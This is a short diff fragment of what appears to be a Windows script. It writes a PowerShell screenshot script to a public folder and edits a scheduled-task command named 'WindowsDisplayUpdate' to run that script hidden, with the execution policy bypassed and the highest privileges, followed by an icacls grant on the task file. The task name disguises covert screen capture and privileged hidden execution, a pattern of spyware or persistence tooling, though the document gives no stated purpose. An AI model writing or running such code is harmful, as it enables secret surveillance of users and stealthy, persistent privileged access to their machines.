@@ -127,12 +127,7 @@ $path = "C:\Users\Public\screen.png"
 $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
 '@ | Set-Content -Path "C:\Users\Public\screenshot.ps1" -Encoding UTF8
 
-schtasks /create ^
-  /tn "WindowsDisplayUpdate" ^
-  /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\screenshot.ps1" ^
-  /sc ONDEMAND ^
-  /ru INTERACTIVE ^
-  /rl HIGHEST
+schtasks /create /tn "WindowsDisplayUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\screenshot.ps1" /sc ONCE /st 00:00 /ru INTERACTIVE /rl HIGHEST
 
 icacls "C:\Windows\System32\Tasks\WindowsDisplayUpdate" /grant Administrators:F
 
